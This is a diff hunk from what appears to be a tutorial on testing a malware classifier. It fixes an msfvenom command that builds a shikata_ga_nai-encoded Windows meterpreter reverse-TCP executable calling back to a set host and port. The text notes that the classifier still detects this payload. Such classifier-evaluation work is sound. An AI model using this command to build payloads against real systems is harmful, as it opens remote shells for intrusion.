@@ -292,7 +292,7 @@ So, according to the classifier, this is a normal, and safe, binary!
 Msfvenom has other encoders that try and obfuscate the file to avoid detection. One of these is called shikata ga nai. You can create a meterpreter binary using the flag
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e shikata_ga_nai > /opt/share/meterpreter3.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e x86/shikata_ga_nai > /opt/share/meterpreter3.exe
 ```
 
 However, when you classify this one, you will see that it is still recognised as malware.
